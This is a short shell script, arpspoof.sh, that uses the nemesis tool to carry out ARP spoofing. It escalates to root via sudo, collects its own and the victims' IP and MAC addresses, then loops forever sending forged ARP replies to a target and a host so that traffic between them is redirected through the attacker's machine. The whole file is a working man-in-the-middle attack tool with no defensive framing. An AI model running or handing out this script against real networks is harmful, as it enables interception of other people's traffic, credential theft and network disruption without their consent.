#!/usr/bin/sh

if [ -z $(which nemesis) ] ; then
    echo "nemesis needed, check in your repositories."
    exit

elif [ $# -ne 3 ] ; then
    echo "Usage: arpspoof.sh INTERFACE TARGET_IP HOST_IP"
    exit

elif [ $(whoami) != "root" ] ; then
    sudo "$0" $@
    exit
fi

# nemesis_req $1=from_ip $2=to_ip $3=to_mac
nemesis_req () {
    nemesis arp -v -r -d $if -S $1 -D $2  -h $own_mac -m $3 -H $own_mac -M $3||\
        echo -e "\e[0;31m[ERROR IN REDIRECTION]\e[0m"
}

if=$1
own_ip=$(ip a|sed -n "/192.168.[01].[^\/]\+/s/^.*\(192[^\/]\+\)\/.*$/\1/p")
echo Own ip: $own_ip
re="/$if/,/^[0-9]/s/^.*ether \([0-9a-f]\{2\}\(:[0-9a-f]\{2\}\)\{5\}\).*$/\1/p"
own_mac=$(ip a|sed -n "$re")
echo Own mac: $own_mac
target_ip=$2
echo Target ip: $target_ip
target_mac=$(arp | grep $target_ip | cut -c 34-50)
echo Target mac: $target_mac
host_ip=$3
echo Host ip: $host_ip
host_mac=$(arp | grep $host_ip | cut -c 34-50)
echo Host mac: $host_mac

while [ 'This script is 42 lines long, do not break it!' ] ; do
    echo -e "\e[0;32mRedirecting...\e[0m"
    nemesis_req $host_ip $target_ip $target_mac
    nemesis_req $target_ip $host_ip $host_mac
    sleep 10
done
